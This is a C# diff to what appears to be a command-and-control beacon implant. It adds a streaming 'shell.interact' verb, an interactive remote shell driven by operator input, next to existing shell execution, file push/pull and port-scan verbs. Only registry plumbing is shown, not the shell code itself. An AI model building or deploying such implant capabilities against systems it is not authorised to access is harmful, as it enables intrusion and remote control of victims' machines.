@@ -76,6 +76,36 @@ internal sealed class CapabilityHandler : ICapabilityHandler
 }
 
 /// <summary>
+/// One compiled handler for a channel verb (architecture.md Sec 10.3, the
+/// streaming task shape): the same registry shape as
+/// <see cref="ICapabilityHandler"/> with a live channel in place of the
+/// one-shot arguments/result grammar. The handler owns the channel for the
+/// life of its task -- it reads operator input and streams output until the
+/// channel ends, and the beacon loop reports its returned outcome as the
+/// task's final TaskResult.
+/// </summary>
+internal sealed class CapabilityChannelHandler
+{
+    private readonly Func<string, IChannelStream, CancellationToken, Task<(TaskOutcome Outcome, string Output)>> _handle;
+
+    public string Verb { get; }
+
+    public CapabilityChannelHandler(
+        string verb,
+        Func<string, IChannelStream, CancellationToken, Task<(TaskOutcome Outcome, string Output)>> handle)
+    {
+        Verb = verb;
+        _handle = handle;
+    }
+
+    public Task<(TaskOutcome Outcome, string Output)> Handle(
+        string arguments,
+        IChannelStream stream,
+        CancellationToken cancellationToken)
+        => _handle(arguments, stream, cancellationToken);
+}
+
+/// <summary>
 /// The compile-time handler registry the beacon dispatches through and derives
 /// its advertised capability set from (architecture.md Sec 5.3). Verbs are
 /// matched case-insensitively; a duplicate registration replaces the earlier
@@ -94,13 +124,20 @@ internal sealed class HandlerRegistry
     // outgrew the string register here.
     private readonly Dictionary<string, Func<string, byte[], (TaskOutcome Outcome, string Output)>> _stagedByVerb;
 
+    // Verb (case-insensitive) -> the channel handler that runs it
+    // (architecture.md Sec 10.3, the streaming task shape): same verb
+    // namespace again, a third input shape -- a live channel in place of the
+    // one-shot arguments/result round trip. Sparse like the staged arm.
+    private readonly Dictionary<string, CapabilityChannelHandler> _channelByVerb;
+
     // The registered verbs in registration order, deduplicated. This is the
     // compiled handler set the advertised capability set derives from.
     private readonly IReadOnlyList<string> _verbs;
 
     private HandlerRegistry(
         IReadOnlyList<ICapabilityHandler> handlers,
-        IReadOnlyList<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)> staged)
+        IReadOnlyList<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)> staged,
+        IReadOnlyList<CapabilityChannelHandler> channels)
     {
         var byVerb = new Dictionary<string, ICapabilityHandler>(handlers.Count, StringComparer.OrdinalIgnoreCase);
         var verbs = new List<string>(handlers.Count);
@@ -122,6 +159,10 @@ internal sealed class HandlerRegistry
             pair => pair.Verb,
             pair => pair.Handle,
             StringComparer.OrdinalIgnoreCase);
+        _channelByVerb = channels.ToDictionary(
+            channel => channel.Verb,
+            channel => channel,
+            StringComparer.OrdinalIgnoreCase);
         _verbs = verbs;
     }
 
@@ -140,6 +181,12 @@ internal sealed class HandlerRegistry
         var handlers = new List<ICapabilityHandler>
         {
             new CapabilityHandler("shell.exec", args => Core.ShellExec(args)),
+            // The channel verbs also register a one-shot fallback so the verb
+            // stays dispatchable everywhere the registry is used: a path with
+            // no channel to carry it (a poll cycle, a future transport
+            // without streams) fails cleanly at the verb instead of losing it.
+            new CapabilityHandler("shell.interact", _ =>
+                (TaskOutcome.Failed, "shell.interact runs as a live channel; this dispatch path does not carry one")),
             new CapabilityHandler("file.push", args => Files.Push(args)),
             new CapabilityHandler("file.pull", args => Files.Pull(args)),
             new CapabilityHandler("recon.portscan", args => Core.PortScan(args)),
@@ -165,7 +212,14 @@ internal sealed class HandlerRegistry
         {
             ("file.push", (args, data) => Files.PushStaged(args, data)),
         };
-        return new HandlerRegistry(handlers, staged);
+
+        // The channel registrations (architecture.md Sec 10.3, the streaming
+        // task shape): shell.interact is shell.exec's live-channel shape.
+        var channels = new List<CapabilityChannelHandler>
+        {
+            new("shell.interact", (args, stream, ct) => InteractiveShell.RunAsync(args, stream, ct)),
+        };
+        return new HandlerRegistry(handlers, staged, channels);
     }
 
     /// <summary>
@@ -230,4 +284,14 @@ internal sealed class HandlerRegistry
             return handle(arguments, data);
         return (TaskOutcome.Failed, "verb does not accept a staged payload: " + verb);
     }
+
+    /// <summary>
+    /// Resolves the verb's registered channel handler (architecture.md Sec
+    /// 10.3, the streaming task shape), or null when the verb is not a
+    /// channel verb. The beacon loop owns the returned handler's lifetime: it
+    /// runs the handler on a live channel and reports its outcome as the
+    /// task's final TaskResult.
+    /// </summary>
+    public CapabilityChannelHandler? ChannelFor(string verb)
+        => _channelByVerb.TryGetValue(verb, out var channel) ? channel : null;
 }
